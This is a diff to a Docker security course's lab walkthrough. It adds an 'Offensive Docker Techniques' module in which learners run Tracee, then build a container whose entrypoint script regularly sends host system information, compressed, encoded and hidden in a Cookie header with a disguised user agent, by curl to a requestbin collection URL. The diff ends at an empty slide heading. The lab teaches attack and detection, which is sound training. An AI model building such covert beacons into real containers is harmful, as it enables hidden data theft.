@@ -1,5 +1,5 @@
 # Labs Walk Thru
-##### This is a accompanying file with the lab instructions and commands to help walk thru the labs. It's especially intended for use for those that have trouble copying and pasting from the slides, or prefer not to.
+##### This is an accompanying file with the lab instructions and commands to help walk thru the labs. It's especially intended for use for those that have trouble copying and pasting from the slides, or prefer not to.
 
 ## Module 1 - Docker
 
@@ -281,3 +281,101 @@ docker trust inspect nginx | jq
 
 ## Module 3: Offensive Docker Techniques
 
+### Slide 47 - Starting Tracee
+
+Start a new terminal window
+```
+docker run --name tracee --rm -it --pid=host --cgroupns=host --privileged -v /etc/os-release:/etc/os-release-host:ro \
+-e LIBBPFGO_OSRELEASE_FILE=/etc/os-release-host aquasec/tracee:latest
+```
+
+>Ctrl-C will stop tracee if needed
+
+### Slide 48 - Create a Dockerfile
+
+```
+cd ~ && mkdir imagetest && cd imagetest && vi Dockerfile
+```
+
+Note: Go to requestbin.com and choose the public bin link below the large Create Request Bin button
+
+Paste the below contents into the vi after hitting `i` for insert
+```
+FROM ubuntu:20.04
+RUN groupadd -g 999 usertest && \
+useradd -r -u 999 -g usertest usertest
+RUN apt update && apt install -y curl tini
+COPY ./docker-entrypoint.sh /docker-entrypoint.sh
+RUN chmod +x docker-entrypoint.sh
+USER usertest
+# Go to requestbin.com and get a public url and replace REQUESTBIN_URL below
+ENV URL REQUESTBIN_URL
+ENV UA "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.7) Gecko/20070917 BonEcho/2.0.0.7"
+# Replace HANDLE with your l33t hacker name or some other identifying designation
+ENV USER HANDLE
+ENTRYPOINT ["/usr/bin/tini", "--", "/docker-entrypoint.sh"]
+```
+> After pasting, hit `ESC`, then type `:wq`
+
+
+### Slide 49 - Create an entrypoint script
+
+```
+vi docker-entrypoint.sh
+```
+Paste the below script into the vi after hitting `i` for insert 
+```
+#!/usr/bin/env bash
+
+if [ "shell" = "${1}" ]; then
+  /bin/bash
+else
+  while true
+  do
+    sleep 30
+    curl -s  -X POST -A "${UA}" -H "X-User: ${HANDLE}" -H "Cookie: `uname -a | gzip | base64 -w0`" $URL
+    echo
+  done
+fi
+```
+> After pasting, hit `ESC`, then type `:wq`
+
+### Slide 50 - Build and run your image
+
+```
+docker build -t cmddemo .
+```
+
+```
+docker run cmddemo
+```
+
+### Slide 51 - Build and run your image (cont.)
+
+The trick to this one is pasting the contents of the cookie field in the request you recieved on requestbin, into the base64 command below. This will decode it and pipe through gunzip to decompress the contents.
+```
+base64 -d <<< [cookie field content] | gunzip
+```
+
+>Take a look back at tracee terminal per slide 52
+
+### Slide 53 - Observing Docker
+
+```
+docker ps
+```
+Note name or id of running container and use it in command below
+```
+docker stop [name or id of running cmddemo container]
+```
+
+```
+docker events
+```
+
+>Alternative to docker events command:
+>```
+>sudo ctr --address /var/run/containerd/containerd.sock events
+>```
+
+### Slide 55 - 
